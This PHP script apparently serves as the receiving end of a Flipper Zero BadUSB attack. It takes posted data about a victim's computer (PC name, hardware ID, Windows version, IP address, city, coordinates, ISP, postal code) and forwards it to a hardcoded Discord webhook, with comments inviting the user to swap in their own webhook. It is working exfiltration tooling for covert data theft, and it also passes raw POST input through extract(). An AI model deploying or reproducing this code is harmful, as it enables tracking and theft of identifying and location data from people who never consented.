<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $webhookurl = "https://discord.com/api/webhooks/1273640789284749343/WqRerkVj0Ov7EIUhB8lgwttYkiH_cDC1UjHaBszoYjASDlalaDXStw354NWDwIMWb8JC"; // Replace with your Discord webhook URL
    // Extract all the POST variables
    extract($_POST);

    // Prepare the data for Discord
    $json_data = json_encode([
        "content" => null,
        "embeds" => [
            [
                "title" => "Result",
                "description" => "Ran On :  ``$date``\nResult :  ``Success``\nLocation :  ``$city``\nFlipper Name : ``FlipperZero``",
                "color" => 16392194,
                "fields" => [
                    [
                        "name" => "Script Pull",
                        "value" => "User's Pc Name : ``$pcname``\nHardware ID (HWID) : ``$hwid``\nIp-Address : ``$ip``\nPC Version : ``$winver``"
                    ],
                    [
                        "name" => "IP-Info",
                        "value" => "Ip-Address :``$ip``\nHostname:``$hostname``\nCity: ``$city``\nRegion: ``$region``\nCo-ordinates: ``$loc``\nISP: ``$org``\nPostal Code: ``$postal``\nTimezone: ``$timezone``"
                    ]
                ],
                "author" => [
                    "name" => "SnappLiminal",
                    "icon_url" => "https://www.dropbox.com/scl/fi/eescnlo24i08y57v8f0vd/62_Pirat_.jpg?rlkey=yf4o4dgdhkene5a9kqegakcge&st=7sw7e7zx&dl=0" //Change to your liking
                ],
                "footer" => [
                    "text" => "-^^,--,~",
                    "icon_url" => "https://tenor.com/lMzeaz9YCpG.gif" //Change to your liking
                ],
                "image" => [
                    "url" => "" //Change to your liking
                ],
                "thumbnail" => [
                    "url" => "" //Change to your liking
                ]
            ]
        ],
        "username" => "Dai Nyte", //Change Your Webhook Name
        "avatar_url" => "https://www.dropbox.com/scl/fi/tqzy0bio4lon2sngh0b0r/IMG_6696.png?rlkey=vig5hkxuqb3z9a1sz8iw58iyi&st=3cchf24r&dl=0",  //Change to your liking
        "attachments" => []
    ]);

    // Use cURL to send the data to the Discord webhook
    $ch = curl_init($webhookurl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    $response = curl_exec($ch);
    // Check for errors
    if(curl_errno($ch)){
        echo 'Request Error:' . curl_error($ch);
    }
    curl_close($ch);
}
?>
